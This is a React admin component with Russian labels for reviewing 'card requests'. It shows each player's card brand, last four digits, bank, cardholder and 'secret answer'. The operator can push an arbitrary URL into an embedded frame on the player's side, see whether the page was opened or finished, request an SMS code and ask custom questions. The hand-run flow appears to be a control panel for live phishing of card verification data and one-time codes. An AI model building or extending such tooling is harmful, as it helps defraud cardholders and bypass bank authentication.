"use client"

import { useState, useTransition, type ReactNode } from "react"
import {
  adminDecide,
  adminRequestCode,
  adminRequestExtraCheck,
  adminResendEvent,
  adminSendRedirect,
  type ActionResult,
  type AdminCardRequest,
} from "@/app/actions/admin-api"
import { CARD_STATUS_LABELS, isCardStatus } from "@/lib/card-statuses"

const STATUS_STYLES: Record<string, string> = {
  pending: "bg-gold/15 text-gold",
  code_requested: "bg-sky-500/15 text-sky-500",
  extra_check: "bg-sky-500/15 text-sky-500",
  confirmed: "bg-emerald-500/15 text-emerald-500",
  rejected: "bg-destructive/15 text-destructive",
}

const FRAME_LABELS: Record<string, string> = {
  opened: "Игрок открыл страницу",
  finished: "Игрок прошёл страницу",
}

function formatDate(date: Date | null) {
  if (!date) return "—"
  return new Intl.DateTimeFormat("ru-RU", { day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit" }).format(new Date(date))
}

const inputClass =
  "min-w-0 flex-1 rounded-xl border border-border/60 bg-background px-3 py-2 text-sm text-foreground outline-none focus:border-primary disabled:opacity-50"
const primaryButton = "shrink-0 rounded-full bg-primary px-4 py-2 text-sm font-semibold text-primary-foreground hover:opacity-90 disabled:opacity-50"
const ghostButton = "shrink-0 rounded-full border border-border/60 px-4 py-2 text-sm text-foreground hover:bg-foreground/5 disabled:opacity-50"

function Field({ label, children }: { label: string; children: ReactNode }) {
  return (
    <div className="flex flex-col gap-0.5">
      <dt className="text-xs text-muted-foreground">{label}</dt>
      <dd className="break-words text-sm text-foreground">{children}</dd>
    </div>
  )
}

function Step({ title, hint, children }: { title: string; hint: string; children: ReactNode }) {
  return (
    <div className="flex flex-col gap-2 rounded-2xl border border-border/60 bg-background/50 p-3">
      <div>
        <p className="text-sm font-semibold text-foreground">{title}</p>
        <p className="text-xs text-muted-foreground">{hint}</p>
      </div>
      {children}
    </div>
  )
}

export function RequestCard({ request }: { request: AdminCardRequest }) {
  const [pending, startTransition] = useTransition()
  const [result, setResult] = useState<ActionResult | null>(null)
  const [url, setUrl] = useState("")
  const [question, setQuestion] = useState("")
  const [reason, setReason] = useState("")
  const requestNo = request.requestNo ?? ""

  const isOpen = request.status === "pending" || request.status === "code_requested" || request.status === "extra_check"
  const statusLabel = isCardStatus(request.status) ? CARD_STATUS_LABELS[request.status] : request.status

  const run = (action: () => Promise<ActionResult>, onOk?: () => void) =>
    startTransition(async () => {
      const outcome = await action()
      setResult(outcome)
      if (outcome.ok) onOk?.()
    })

  const resend = () =>
    startTransition(async () => {
      const outcome = await adminResendEvent(requestNo)
      setResult(
        outcome.ok
          ? { ok: true, message: `Вебхук ${outcome.event} доставлен (HTTP ${outcome.status})` }
          : { ok: false, error: `Вебхук ${outcome.event}: ${outcome.error ?? "ошибка"}` },
      )
    })

  const copyNo = () => navigator.clipboard.writeText(requestNo)

  return (
    <article className="flex flex-col gap-4 rounded-3xl border border-border/60 bg-card p-5">
      <header className="flex flex-wrap items-center gap-2">
        <button type="button" onClick={copyNo} title="Скопировать номер" className="font-mono text-base font-bold text-foreground hover:text-primary">
          {requestNo}
        </button>
        <span className={`rounded-full px-2.5 py-0.5 text-xs font-semibold ${STATUS_STYLES[request.status] ?? "bg-muted text-muted-foreground"}`}>
          {statusLabel}
        </span>
        <span className="ml-auto text-xs tabular-nums text-muted-foreground">{formatDate(request.createdAt)}</span>
      </header>

      <dl className="grid grid-cols-2 gap-3 sm:grid-cols-3">
        <Field label="Игрок">
          {request.userName || "—"}
          <span className="block text-xs text-muted-foreground">{request.userEmail}</span>
        </Field>
        <Field label="Карта">
          {`${request.brand ?? "Карта"} •••• ${request.last4}`}
          <span className="block text-xs text-muted-foreground">{request.bankName ?? "—"}</span>
        </Field>
        <Field label="Держатель">{request.cardholder || "—"}</Field>
        <Field label="Ответ игрока">
          <span className="font-mono">{request.secretAnswer || "—"}</span>
        </Field>
        <Field label="Страница проверки">
          {request.redirectUrl ? FRAME_LABELS[request.frameStatus ?? ""] ?? "Ссылка отправлена" : "Не отправлена"}
        </Field>
        <Field label="Обработана">{formatDate(request.processedAt)}</Field>
        {request.extraCheckQuestion && <Field label="Доп. вопрос">{request.extraCheckQuestion}</Field>}
        {request.resultReason && <Field label="Причина">{request.resultReason}</Field>}
      </dl>

      {isOpen && (
        <div className="grid gap-3 lg:grid-cols-2">
          <Step title="1. Страница проверки" hint="Откроется у игрока во встроенном окне">
            <div className="flex gap-2">
              <label htmlFor={`url-${requestNo}`} className="sr-only">Ссылка</label>
              <input
                id={`url-${requestNo}`}
                type="url"
                inputMode="url"
                placeholder="https://..."
                value={url}
                onChange={(event) => setUrl(event.target.value)}
                disabled={pending}
                className={inputClass}
              />
              <button type="button" disabled={pending || !url.trim()} onClick={() => run(() => adminSendRedirect(requestNo, url), () => setUrl(""))} className={primaryButton}>
                Отправить
              </button>
            </div>
          </Step>

          <Step title="2. Дополнительно" hint="Код из SMS или свой вопрос игроку">
            <div className="flex gap-2">
              <label htmlFor={`q-${requestNo}`} className="sr-only">Вопрос</label>
              <input
                id={`q-${requestNo}`}
                placeholder="Вопрос игроку"
                maxLength={300}
                value={question}
                onChange={(event) => setQuestion(event.target.value)}
                disabled={pending}
                className={inputClass}
              />
              <button type="button" disabled={pending || !question.trim()} onClick={() => run(() => adminRequestExtraCheck(requestNo, question), () => setQuestion(""))} className={ghostButton}>
                Спросить
              </button>
            </div>
            <button type="button" disabled={pending} onClick={() => run(() => adminRequestCode(requestNo))} className={`${ghostButton} self-start`}>
              Запросить код
            </button>
          </Step>

          <Step title="3. Решение" hint="Причину отказа увидит игрок">
            <label htmlFor={`r-${requestNo}`} className="sr-only">Причина</label>
            <input
              id={`r-${requestNo}`}
              placeholder="Причина отказа"
              maxLength={200}
              value={reason}
              onChange={(event) => setReason(event.target.value)}
              disabled={pending}
              className={inputClass}
            />
            <div className="flex gap-2">
              <button type="button" disabled={pending} onClick={() => run(() => adminDecide(requestNo, "approve", ""))} className="flex-1 rounded-full bg-emerald-600 px-4 py-2 text-sm font-semibold text-white hover:opacity-90 disabled:opacity-50">
                Подтвердить
              </button>
              <button type="button" disabled={pending} onClick={() => run(() => adminDecide(requestNo, "reject", reason))} className="flex-1 rounded-full bg-destructive px-4 py-2 text-sm font-semibold text-white hover:opacity-90 disabled:opacity-50">
                Отклонить
              </button>
            </div>
          </Step>
        </div>
      )}

      <footer className="flex flex-wrap items-center gap-3">
        <button type="button" disabled={pending} onClick={resend} className={ghostButton}>
          Повторить вебхук
        </button>
        <p role="status" aria-live="polite" className={`text-sm ${result?.ok ? "text-emerald-500" : "text-destructive"}`}>
          {pending ? <span className="text-muted-foreground">Выполняю…</span> : result ? (result.ok ? result.message : result.error) : null}
        </p>
      </footer>
    </article>
  )
}
